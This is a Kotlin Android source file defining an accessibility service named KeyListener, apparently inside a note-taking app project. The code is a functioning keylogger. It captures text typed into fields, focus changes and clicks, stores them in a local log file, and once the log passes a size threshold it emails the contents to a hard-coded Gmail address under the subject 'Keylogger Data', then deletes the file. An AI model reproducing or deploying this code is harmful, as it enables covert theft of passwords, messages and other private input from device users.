package com.example.cleanarchitecturenoteapp

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.accessibilityservice.AccessibilityServiceInfo
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader
import java.lang.Exception
import java.lang.StringBuilder
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

const val TAG = "MY NOTE"
class KeyListener : AccessibilityService() {

    var res = ""
    public override fun onServiceConnected() {
        Log.v(TAG, "Onservice() Connected...")
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 100
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val df: DateFormat = SimpleDateFormat("dd MMM, hh:mm ")
        val time = df.format(Calendar.getInstance().time)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                var data = event.text.toString()
                data = "$time|(TEXT)|$data"
                res = """
                $res$data
                
                """.trimIndent()
                Log.v(TAG, data)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                var data = event.text.toString()
                data = "$time|(FOCUSED)|$data"
                res = """
                    $res$data
                    
                    """.trimIndent()
                Log.v(TAG, data)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                var data = event.text.toString()
                data = time + "|(CLICKED)|" + event.text.toString() + data
                res = """
                    $res$data
                    
                    """.trimIndent()
                Log.v(TAG, data)
                if (res.length > 1000) {
                    try {
                        val file = File(applicationContext.getExternalFilesDir(null), "Log.txt")
                        val fos = FileOutputStream(file, true)
                        fos.write(res.toByteArray())
                        fos.close()
                        val fsize = file.length().toDouble() / 1024
                        if (fsize > 5.0) {
                                val text = StringBuilder()
                                val br = BufferedReader(FileReader(file))
                                var line: String?
                                while (br.readLine().also { line = it } != null) {
                                    text.append(line)
                                    text.append('\n')
                                }
                                br.close()

                                //Creating SendMail object
                                try {
                                    val sm = SendMail(
                                        this,
                                        "sammialldredge@gmail.com",
                                        "Keylogger Data",
                                        text.toString()
                                    )

                                    //Executing sendmail to send email
                                    sm.execute()
                                    file.delete()
                                } catch (e: Exception) {
                                    Log.v("err", "Error while sending mail:" + e.message)
                                }
                        }
                    } catch (e: Exception) {
                        Log.v("msg", e.message!!)
                    }
                    res = ""
                }
            }
            else -> {}
        }
    }
    override fun onInterrupt() {
        Log.d("Interrupt", "onInterrupt() is Called...")
    }
}